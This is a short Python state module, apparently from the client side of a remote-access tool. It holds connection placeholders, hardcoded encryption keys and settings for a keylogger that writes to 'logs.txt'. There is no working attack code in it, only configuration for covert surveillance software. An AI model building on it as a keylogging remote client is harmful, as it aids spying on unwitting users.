from foreign.utility.client_root import *
from binary.encrypt_data import *


state = {
  'root': client_root(),
  'file': None,
  'ip': None,
  'port': None,
  'settings': {
    'encoding': 'latin-1',
    'headersize': 10,
    'encryption': Encryption(
                  'ksxgyRuBRJLKxjFeHD4nmxbE',
                  b'v4CuHZFzmTedBY2EBGrLRXsm')
  },
  'keylogger': {
    'file': 'logs.txt',
    'running': False,
    'thread': None,
    'first': True
  }
}